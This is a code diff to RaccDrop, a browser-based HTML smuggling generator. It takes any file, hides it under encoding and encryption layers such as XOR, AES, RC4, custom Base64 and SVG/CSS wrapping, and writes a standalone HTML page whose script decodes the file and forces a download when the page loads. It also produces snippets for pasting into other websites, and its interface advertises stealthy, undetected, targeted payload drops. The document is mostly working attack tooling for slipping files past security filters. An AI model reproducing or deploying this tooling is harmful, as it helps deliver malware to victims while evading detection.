@@ -5,70 +5,220 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>RaccDrop - HTML Smuggling Selfcontained HTML generator</title>
   <style>
+    * { box-sizing: border-box; }
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #121212;
-      color: #e0e0e0;
+      font-family: 'Courier New', Consolas, 'Liberation Mono', monospace;
+      background-color: #0a0a0a;
+      color: #c0c0c0;
       text-align: center;
-      padding: 40px;
+      padding: 40px 20px;
+      min-height: 100vh;
+      position: relative;
+      overflow-x: hidden;
+    }
+    /* Matrix rain background */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 255, 0, 0.015) 2px,
+        rgba(0, 255, 0, 0.015) 4px
+      );
+      pointer-events: none;
+      z-index: 0;
     }
     .container {
-      max-width: 760px;
+      max-width: 720px;
       margin: auto;
-      background: #1e1e1e;
+      background: linear-gradient(180deg, #0d0d0d 0%, #111 100%);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,255,255,0.1);
+      border-radius: 8px;
+      border: 1px solid #1a3a1a;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.08), inset 0 0 60px rgba(0, 0, 0, 0.5);
+      position: relative;
+      z-index: 1;
+      text-align: left;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #1a3a1a;
     }
     h1 {
-      font-size: 1.8em;
-      margin-bottom: 10px;
-      color: #00e5ff;
+      font-size: 2em;
+      margin: 0 0 4px 0;
+      letter-spacing: 2px;
     }
-    p { margin: 10px 0; }
+    h1 .racc { color: #999; }
+    h1 .drop { color: #00ff00; text-shadow: 0 0 10px rgba(0,255,0,0.5); }
+    .tagline {
+      font-size: 0.85em;
+      color: #666;
+      margin: 6px 0 0 0;
+      letter-spacing: 1px;
+    }
+    .tagline strong { color: #00ff00; }
 
-    input, select, button {
+    .prompt { color: #00ff00; }
+    .label-text { color: #888; font-size: 0.9em; margin-bottom: 4px; display: block; }
+
+    input[type="file"], select, button {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      font-size: 1em;
-      border-radius: 6px;
-      border: 1px solid #555;
-      background-color: #2c2c2c;
-      color: #e0e0e0;
+      padding: 10px 12px;
+      margin: 6px 0 14px 0;
+      font-size: 0.95em;
+      font-family: inherit;
+      border-radius: 4px;
+      border: 1px solid #1a3a1a;
+      background-color: #0d0d0d;
+      color: #c0ffc0;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
-    button { background-color: #00e5ff; color: #121212; border: none; cursor: pointer; font-weight: bold; }
-    button:hover { background-color: #00bcd4; }
+    input[type="file"]:focus, select:focus {
+      border-color: #00ff00;
+      box-shadow: 0 0 8px rgba(0,255,0,0.2);
+    }
+    select option { background: #111; color: #c0ffc0; }
 
-    a { color: #80d8ff; text-decoration: none; }
+    button {
+      background: linear-gradient(180deg, #00cc00 0%, #009900 100%);
+      color: #000;
+      border: 1px solid #00ff00;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 1em;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-top: 8px;
+      text-shadow: 0 1px 0 rgba(255,255,255,0.2);
+    }
+    button:hover {
+      background: linear-gradient(180deg, #00ff00 0%, #00cc00 100%);
+      box-shadow: 0 0 16px rgba(0,255,0,0.4);
+    }
+
+    #multiOpts {
+      display: none;
+      margin: 6px 0 14px 0;
+      padding: 12px;
+      background: #0d0d0d;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+    }
+    #multiOpts strong { color: #00ff00; font-size: 0.9em; }
+    #multiOpts label {
+      display: inline-block;
+      margin: 6px 14px 2px 0;
+      cursor: pointer;
+      color: #aaa;
+      font-size: 0.9em;
+    }
+    #multiOpts input[type="checkbox"] { accent-color: #00ff00; margin-right: 4px; }
+
+    a { color: #00ff00; text-decoration: none; }
     a:hover { text-decoration: underline; }
 
-    details { text-align: left; margin-top: 10px; }
-    summary { cursor: pointer; font-weight: 600; }
-    .snippet { background:#111; border:1px solid #333; border-radius:8px; padding:10px; margin:10px 0; }
-    .snip-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; font-size:0.95em; color:#a0a0a0; }
-    .snip-header button { width:auto; padding:6px 10px; margin:0; font-size:0.9em; }
-    pre { margin:0; overflow:auto; max-height:320px; }
-    code { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size:0.9em; }
+    details { text-align: left; margin-top: 14px; }
+    summary { cursor: pointer; font-weight: 600; color: #00ff00; }
+    .snippet { background: #0a0a0a; border: 1px solid #1a3a1a; border-radius: 4px; padding: 10px; margin: 8px 0; }
+    .snip-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; font-size: 0.85em; color: #666; }
+    .snip-header button { width: auto; padding: 4px 10px; margin: 0; font-size: 0.85em; text-transform: none; letter-spacing: 0; }
+    pre { margin: 0; overflow: auto; max-height: 300px; }
+    code { font-family: inherit; font-size: 0.9em; color: #c0ffc0; }
+
+    #status { margin-top: 16px; color: #c0c0c0; font-size: 0.95em; }
+    #status strong { color: #00ff00; }
+
+    .features {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 20px;
+      padding-top: 16px;
+      border-top: 1px solid #1a3a1a;
+      text-align: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .feat {
+      font-size: 0.75em;
+      color: #555;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .feat span { display: block; color: #00ff00; font-weight: bold; font-size: 1.1em; margin-bottom: 2px; }
+
+    .footer-line {
+      text-align: center;
+      margin-top: 14px;
+      font-size: 0.8em;
+      color: #333;
+      letter-spacing: 2px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🦝 RaccDrop - Hide Your Trash</h1>
-    <p>Select your shiny file and choose how to disguise it:</p>
+    <div class="header">
+      <h1>🦝 <span class="racc">Racc</span><span class="drop">Drop</span></h1>
+      <p class="tagline">YOUR PAYLOAD. <strong>OUR DROP.</strong></p>
+    </div>
+
+    <span class="label-text"><span class="prompt">&gt;</span> select target</span>
     <input type="file" id="fileInput" />
+
+    <span class="label-text"><span class="prompt">&gt;</span> configure drop</span>
     <select id="method">
       <option value="css">Hide the paws in CSS</option>
       <option value="xor">Encrypt trash with XOR</option>
       <option value="aes">Lock it with AES</option>
+      <option value="rc4">Scramble with RC4</option>
       <option value="base64">Wrap in Base64</option>
       <option value="hex">Hexify the junk</option>
+      <option value="reverse">Reverse the string</option>
+      <option value="charcode">CharCode array</option>
+      <option value="decimal">Decimal dot notation</option>
+      <option value="customb64">Custom Base64 alphabet</option>
+      <option value="svg">Stash in SVG</option>
+      <option value="multi">Multi-layer chain</option>
     </select>
-    <button onclick="generateHTML()">Smuggle It!</button>
+    <div id="multiOpts">
+      <strong>&gt; select layers (applied top to bottom):</strong><br><br>
+      <label><input type="checkbox" class="multiCb" value="xor"> XOR</label>
+      <label><input type="checkbox" class="multiCb" value="aes"> AES</label>
+      <label><input type="checkbox" class="multiCb" value="rc4"> RC4</label>
+      <label><input type="checkbox" class="multiCb" value="base64"> Base64</label>
+      <label><input type="checkbox" class="multiCb" value="hex"> Hex</label>
+      <label><input type="checkbox" class="multiCb" value="reverse"> Reverse</label>
+      <label><input type="checkbox" class="multiCb" value="charcode"> CharCode</label>
+      <label><input type="checkbox" class="multiCb" value="decimal"> Decimal</label>
+      <label><input type="checkbox" class="multiCb" value="customb64"> Custom B64</label>
+    </div>
+
+    <button onclick="generateHTML()">&gt;&gt; Execute Drop &lt;&lt;</button>
     <p id="status"></p>
+
+    <div class="features">
+      <div class="feat"><span>Stealthy</span>undetected drops</div>
+      <div class="feat"><span>Secure</span>encrypted delivery</div>
+      <div class="feat"><span>Precise</span>targeted payloads</div>
+      <div class="feat"><span>Approved</span>raccoon certified</div>
+    </div>
+    <div class="footer-line">&gt;&gt; DROP IT LIKE A RACCOON &lt;&lt;</div>
   </div>
 
   <script>
+    // --- Toggle multi-layer options ---
+    document.getElementById('method').addEventListener('change', function() {
+      document.getElementById('multiOpts').style.display = this.value === 'multi' ? 'block' : 'none';
+    });
+
+    // --- Utility helpers ---
     const randomKey = (l = 16) =>
       [...Array(l)].map(() =>
         "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * 62))
@@ -99,6 +249,56 @@
       return new TextDecoder().decode(dec);
     }
 
+    // RC4 stream cipher
+    function rc4(data, key) {
+      const s = Array.from({length: 256}, (_, i) => i);
+      let j = 0;
+      for (let i = 0; i < 256; i++) {
+        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
+        [s[i], s[j]] = [s[j], s[i]];
+      }
+      let ii = 0; j = 0;
+      return [...data].map(c => {
+        ii = (ii + 1) % 256;
+        j = (j + s[ii]) % 256;
+        [s[ii], s[j]] = [s[j], s[ii]];
+        return String.fromCharCode(c.charCodeAt(0) ^ s[(s[ii] + s[j]) % 256]);
+      }).join('');
+    }
+    const rc4Enc = (d, k) => btoa(rc4(d, k));
+    const rc4Dec = (d, k) => rc4(atob(d), k);
+
+    // Reverse string
+    const reverseStr = d => [...d].reverse().join('');
+
+    // CharCode array
+    const toCharCodes = d => JSON.stringify([...d].map(c => c.charCodeAt(0)));
+    const fromCharCodes = d => JSON.parse(d).map(c => String.fromCharCode(c)).join('');
+
+    // Decimal dot notation
+    const toDecimal = d => [...d].map(c => c.charCodeAt(0)).join('.');
+    const fromDecimal = d => d.split('.').map(n => String.fromCharCode(+n)).join('');
+
+    // Custom Base64 alphabet
+    const stdB64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+    function shuffleAlpha(key) {
+      const arr = stdB64.split('');
+      for (let i = arr.length - 1; i > 0; i--) {
+        const j = key.charCodeAt(i % key.length) % (i + 1);
+        [arr[i], arr[j]] = [arr[j], arr[i]];
+      }
+      return arr.join('');
+    }
+    function customB64Enc(d, key) {
+      const alpha = shuffleAlpha(key);
+      return btoa(d).split('').map(c => c === '=' ? '=' : alpha[stdB64.indexOf(c)]).join('');
+    }
+    function customB64Dec(d, key) {
+      const alpha = shuffleAlpha(key);
+      return atob(d.split('').map(c => c === '=' ? '=' : stdB64[alpha.indexOf(c)]).join(''));
+    }
+
+    // --- General utilities ---
     const selectedMethodLabel = () =>
       document.querySelector('#method option:checked').textContent;
 
@@ -113,12 +313,96 @@
       const el = document.getElementById(id);
       if (!el) return;
       const text = el.textContent;
-      navigator.clipboard?.writeText(text).then(()=>{
+      navigator.clipboard?.writeText(text).then(() => {
         const btn = el.closest('.snippet').querySelector('button[data-copy]');
-        if (btn) { const old = btn.textContent; btn.textContent = 'Copied!'; setTimeout(()=>btn.textContent=old, 1200); }
-      }).catch(()=>{});
+        if (btn) { const old = btn.textContent; btn.textContent = '[+] copied'; setTimeout(() => btn.textContent = old, 1200); }
+      }).catch(() => {});
     }
 
+    // --- Unified encode helper ---
+    async function encodeData(data, method, key) {
+      switch (method) {
+        case 'aes': return await aesEnc(data, key);
+        case 'xor': return xorEnc(data, key);
+        case 'rc4': return rc4Enc(data, key);
+        case 'hex': return toHex(data);
+        case 'base64': return btoa(data);
+        case 'reverse': return reverseStr(data);
+        case 'charcode': return toCharCodes(data);
+        case 'decimal': return toDecimal(data);
+        case 'customb64': return customB64Enc(data, key);
+        default: return data;
+      }
+    }
+
+    // --- Build decode chain for generated payload ---
+    function buildDecodeChain(methods, key) {
+      return methods.map(m => {
+        switch (m) {
+          case 'aes': return `d=await(${aesDec.toString()})(d,"${key}");`;
+          case 'xor': return `d=(${xorDec.toString()})(d,"${key}");`;
+          case 'rc4': return `${rc4.toString()}\nd=rc4(atob(d),"${key}");`;
+          case 'hex': return `d=decodeURIComponent(d.replace(/(..)/g,'%$1'));`;
+          case 'base64': return `d=atob(d);`;
+          case 'reverse': return `d=[...d].reverse().join('');`;
+          case 'charcode': return `d=JSON.parse(d).map(c=>String.fromCharCode(c)).join('');`;
+          case 'decimal': return `d=d.split('.').map(n=>String.fromCharCode(+n)).join('');`;
+          case 'customb64': return `const _std='${stdB64}';\n${shuffleAlpha.toString().replace(/stdB64/g,'_std')}\n${customB64Dec.toString().replace(/stdB64/g,'_std')}\nd=customB64Dec(d,"${key}");`;
+          case 'css': return `d=atob(document.getElementById('data').dataset.file);`;
+          case 'svg': return `d=atob(document.getElementById('svgData').dataset.payload);`;
+          default: return '';
+        }
+      }).join('\n');
+    }
+
+    // --- Build JS snippet for copy-paste ---
+    function buildJsSnippet(methods, data, key, fileName) {
+      const isAsync = methods.includes('aes');
+      const prefix = isAsync ? 'async ' : '';
+      const reversed = [...methods].reverse();
+      let fnDefs = '';
+      let calls = '';
+
+      for (const m of reversed) {
+        switch (m) {
+          case 'aes':
+            fnDefs += `  ${aesDec.toString()}\n`;
+            calls += `  d = await aesDec(d, "${key}");\n`;
+            break;
+          case 'xor':
+            fnDefs += `  const xorDec = ${xorDec.toString()};\n`;
+            calls += `  d = xorDec(d, "${key}");\n`;
+            break;
+          case 'rc4':
+            fnDefs += `  ${rc4.toString()}\n`;
+            calls += `  d = rc4(atob(d), "${key}");\n`;
+            break;
+          case 'hex':
+            calls += `  d = decodeURIComponent(d.replace(/(..)/g, '%$1'));\n`;
+            break;
+          case 'base64':
+            calls += `  d = atob(d);\n`;
+            break;
+          case 'reverse':
+            calls += `  d = [...d].reverse().join('');\n`;
+            break;
+          case 'charcode':
+            calls += `  d = JSON.parse(d).map(c => String.fromCharCode(c)).join('');\n`;
+            break;
+          case 'decimal':
+            calls += `  d = d.split('.').map(n => String.fromCharCode(+n)).join('');\n`;
+            break;
+          case 'customb64':
+            fnDefs += `  const stdB64 = '${stdB64}';\n  ${shuffleAlpha.toString()}\n  ${customB64Dec.toString()}\n`;
+            calls += `  d = customB64Dec(d, "${key}");\n`;
+            break;
+        }
+      }
+
+      return `(${prefix}() => {\n${fnDefs}  let d = "${data}";\n${calls}  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${fileName}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
+    }
+
+    // --- Main generation function ---
     async function generateHTML() {
       const file = document.getElementById('fileInput').files[0];
       const method = document.getElementById('method').value;
@@ -127,53 +411,82 @@
       const key = randomKey();
 
       if (!file) {
-        document.getElementById('status').innerText = "🦝 No trash selected!";
+        document.getElementById('status').innerHTML = '<span class="prompt">[!]</span> No target selected.';
         return;
       }
 
       const reader = new FileReader();
       reader.onload = async () => {
         let data = reader.result; // Data URL string
-        if (method === 'aes') data = await aesEnc(data, key);
-        if (method === 'xor') data = xorEnc(data, key);
-        if (method === 'hex') data = toHex(data);
-        if (method === 'base64') data = btoa(data);
-        if (method === 'css') data = `<div id="data" data-file="${btoa(data)}"></div>`;
 
-        // --- Build copy/paste snippets for both: UI panel and the generated HTML ---
+        // Determine layers
+        let layers = [];
+        if (method === 'multi') {
+          layers = [...document.querySelectorAll('.multiCb:checked')].map(cb => cb.value);
+          if (layers.length === 0) {
+            document.getElementById('status').innerHTML = '<span class="prompt">[!]</span> Select at least one layer.';
+            return;
+          }
+        }
+
+        // Apply encoding
+        if (method === 'css') {
+          data = '<div id="data" data-file="' + btoa(data) + '"></div>';
+        } else if (method === 'svg') {
+          data = '<svg id="svgData" xmlns="http://www.w3.org/2000/svg" style="display:none" data-payload="' + btoa(data) + '"></svg>';
+        } else if (method === 'multi') {
+          for (const m of layers) {
+            data = await encodeData(data, m, key);
+          }
+        } else {
+          data = await encodeData(data, method, key);
+        }
+
+        // Build decode chain
+        let decodeChain;
+        if (method === 'css') {
+          decodeChain = 'd=atob(document.getElementById(\'data\').dataset.file);';
+        } else if (method === 'svg') {
+          decodeChain = 'd=atob(document.getElementById(\'svgData\').dataset.payload);';
+        } else {
+          const decodeMethods = method === 'multi' ? [...layers].reverse() : [method];
+          decodeChain = buildDecodeChain(decodeMethods, key);
+        }
+
+        // Build copy/paste snippets
         let htmlSnippet = '';
         let jsSnippet = '';
 
         if (method === 'css') {
-          htmlSnippet = data; // the <div id="data" ...>
+          htmlSnippet = data;
           jsSnippet = `(() => {\n  const d = atob(document.getElementById('data').dataset.file);\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
-        } else if (method === 'base64') {
-          htmlSnippet = '<!-- No extra HTML needed for Base64 method -->';
-          jsSnippet = `(() => {\n  let d = atob("${data}");\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
-        } else if (method === 'hex') {
-          htmlSnippet = '<!-- No extra HTML needed for Hex method -->';
-          jsSnippet = `(() => {\n  let d = decodeURIComponent("${data}".replace(/(..)/g,'%$1'));\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
-        } else if (method === 'xor') {
-          htmlSnippet = '<!-- No extra HTML needed for XOR method -->';
-          jsSnippet = `(() => {\n  function xorDec(d,k){ return atob(d).split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join(''); }\n  let d = xorDec("${data}", "${key}");\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
-        } else if (method === 'aes') {
-          htmlSnippet = '<!-- No extra HTML needed for AES method -->';
-          jsSnippet = `(async () => {\n  async function aesDec(data, key) {\n    const raw = atob(data);\n    const iv = new Uint8Array([...raw.slice(0,12)].map(c => c.charCodeAt(0)));\n    const encData = new Uint8Array([...raw.slice(12)].map(c => c.charCodeAt(0)));\n    const k = await crypto.subtle.importKey('raw', new TextEncoder().encode(key), { name: 'AES-GCM' }, false, ['decrypt']);\n    const dec = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, k, encData);\n    return new TextDecoder().decode(dec);\n  }\n  let d = await aesDec("${data}", "${key}");\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
+        } else if (method === 'svg') {
+          htmlSnippet = data;
+          jsSnippet = `(() => {\n  const d = atob(document.getElementById('svgData').dataset.payload);\n  const a = document.createElement('a');\n  a.href = d;\n  a.download = '${file.name}';\n  document.body.appendChild(a);\n  a.click();\n  a.remove();\n})();`;
+        } else if (method === 'multi') {
+          htmlSnippet = '<!-- No extra HTML needed for Multi-layer method -->';
+          jsSnippet = buildJsSnippet(layers, data, key, file.name);
+        } else {
+          htmlSnippet = '<!-- No extra HTML needed for ' + methodLabel + ' -->';
+          jsSnippet = buildJsSnippet([method], data, key, file.name);
         }
 
         const htmlSnippetEsc = escapeHTML(htmlSnippet);
         const jsSnippetEsc = escapeHTML(jsSnippet);
 
-        // Escape for safe embedding into inline script
+        // Escape data for inline script embedding
         const escapedData = data
           .replace(/\\/g, '\\\\')
           .replace(/'/g, "\\'")
           .replace(/\"/g, '\\"');
 
-        // Panel HTML to embed inside generated payload
-        const embeddedPanel = `\n<div class=\"panel\">\n  <div class=\"meta\"><strong>Method:</strong> ${methodLabel} (${method})</div>\n  <p class=\"meta\">Copy & paste these snippets into another website to reconstruct and download the original file.</p>\n  <h3>HTML payload</h3>\n  <pre><code>${htmlSnippetEsc}</code></pre>\n  <h3>JavaScript</h3>\n  <pre><code>${jsSnippetEsc}</code></pre>\n</div>`;
+        // Method description for manifest
+        const methodDesc = method === 'multi' ? `Multi-layer [${layers.join(' > ')}]` : `${methodLabel} (${method})`;
 
-        // Generated HTML with embedded manifest + visible snippets panel
+        // Panel HTML for generated payload
+        const embeddedPanel = `\n<div style="font-family:monospace;background:#0a0a0a;color:#c0ffc0;border:1px solid #1a3a1a;border-radius:4px;padding:12px;margin:10px 0;">\n  <div style="color:#666;font-size:0.9em;"><strong style="color:#00ff00;">Method:</strong> ${methodDesc}</div>\n  <p style="color:#666;font-size:0.85em;">Copy & paste these snippets to reconstruct and download the original file.</p>\n  <h3 style="color:#00ff00;font-size:0.9em;">HTML payload</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${htmlSnippetEsc}</code></pre>\n  <h3 style="color:#00ff00;font-size:0.9em;">JavaScript</h3>\n  <pre style="background:#111;border:1px solid #1a3a1a;border-radius:4px;padding:8px;overflow:auto;max-height:200px;"><code>${jsSnippetEsc}</code></pre>\n</div>`;
+
+        // Generated self-contained HTML payload
         const genHTML = `<!DOCTYPE html>
 <html>
 <head>
@@ -184,30 +497,25 @@
   <meta name="raccdrop-filename" content="${file.name}">
   <meta name="raccdrop-generated" content="${stamp}">
   <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 1rem; }
-    .panel { background:#f7f7f7; color:#222; border:1px solid #ddd; border-radius:8px; padding:10px; margin:10px 0; }
-    pre { background:#222; color:#f1f1f1; border-radius:6px; padding:10px; overflow:auto; max-height:300px; }
-    code { font-family: ui-monospace, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size:0.9em; }
-    .meta { color:#555; font-size:0.9em; }
+    body { font-family: monospace; background: #0a0a0a; color: #c0ffc0; padding: 1rem; }
+    pre { background:#111; border:1px solid #1a3a1a; border-radius:4px; padding:10px; overflow:auto; max-height:300px; }
+    code { font-family: inherit; font-size:0.9em; }
   </style>
 </head>
 <body>
 <!--
   RaccDrop Manifest
   -----------------
-  Method: ${methodLabel} (${method})
+  Method: ${methodDesc}
   Source filename: ${file.name}
   Generated (ISO): ${stamp}
+  Key: ${key}
 -->
 ${data}
 <script>
 (async()=>{
 let d="${escapedData}";
-${method === 'aes' ? `d=await(${aesDec.toString()})(d,"${key}");` : ''}
-${method === 'xor' ? `d=(${xorDec.toString()})(d,"${key}");` : ''}
-${method === 'hex' ? `d=decodeURIComponent(d.replace(/(..)/g,'%$1'));` : ''}
-${method === 'base64' ? `d=atob(d);` : ''}
-${method === 'css' ? `d=atob(document.getElementById('data').dataset.file);` : ''}
+${decodeChain}
 const l=document.createElement('a');
 l.href=d;
 l.download='${file.name}';
@@ -225,12 +533,12 @@ ${embeddedPanel}
         link.download = `raccdrop_${method}_${file.name}.html`;
         link.click();
 
-        // Enhanced status output with method label and copy-paste snippets (also in UI)
+        // Status output
         document.getElementById('status').innerHTML = `
-          🦝 Trash smuggled successfully!<br>
-          <small>Method: <strong>${methodLabel}</strong></small>
+          <span class="prompt">[+]</span> payload delivered<br>
+          <small style="color:#666">Method: <strong>${methodDesc}</strong></small>
           <details open>
-            <summary>Show copy‑paste snippets for <em>${methodLabel}</em></summary>
+            <summary>&gt; show copy-paste snippets</summary>
             <div class="snippet">
               <div class="snip-header">HTML payload <button data-copy onclick="copySnippet('htmlSnip')">Copy</button></div>
               <pre><code id="htmlSnip">${htmlSnippetEsc}</code></pre>
